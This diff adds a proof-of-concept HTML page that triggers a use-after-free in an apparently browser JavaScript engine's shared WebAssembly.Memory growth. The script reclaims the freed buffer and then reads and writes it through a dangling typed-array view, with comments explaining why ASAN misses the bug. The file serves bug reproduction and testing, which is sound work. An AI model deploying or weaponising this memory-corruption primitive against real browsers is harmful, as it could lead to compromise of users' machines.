@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<!--
+  Minimal trigger for the shared-WebAssembly.Memory UAF.
+
+  NOTE: ASAN does NOT catch this. The only consumer of the stale
+  TypedArray.m_data pointer is the hand-written asm interpreter
+  (asmint.asm), which ASAN cannot instrument; every C++ accessor
+  re-derives the pointer through viewed_array_buffer()->buffer().data()
+  and correctly sees the relocated storage. The reclaim-and-compare
+  below is the way to demonstrate the UAF.
+-->
+<pre id=o></pre>
+<script>
+const log = s => document.getElementById('o').textContent += s + '\n';
+
+const mem  = new WebAssembly.Memory({initial: 1, maximum: 1000, shared: true});
+const view = new Uint32Array(mem.buffer);
+
+mem.grow(1);    // ByteBuffer reallocs 64K -> 128K @ X; view.m_data refreshed to X; m_buffer replaced
+mem.grow(100);  // ByteBuffer reallocs 128K -> 6.5M; X freed; only the *new* wrapper's views refreshed
+
+// Make the UAF observable by reclaiming X with a same-size-class allocation
+// and writing a sentinel through it. (ASAN won't flag the read either way:
+// the asm fast path that dereferences m_data isn't instrumented.)
+const reclaim = new Uint32Array(new ArrayBuffer(131072));
+reclaim[0] = 0xDEADBEEF|0;
+
+const r = view[0] >>> 0;                                          // UAF read at X
+log('view[0] = 0x' + r.toString(16));
+if (r === 0xDEADBEEF) {
+  log('>>> UAF CONFIRMED: dangling view aliases the reclaiming ArrayBuffer <<<');
+  view[0] = 0x41414141|0;                                         // UAF write at X
+  log('reclaim[0] after write-through-view = 0x' + (reclaim[0]>>>0).toString(16));
+} else {
+  log('(reclaim did not land at X on this run; rerun, or use a release build where mimalloc reuses X immediately)');
+}
+</script>
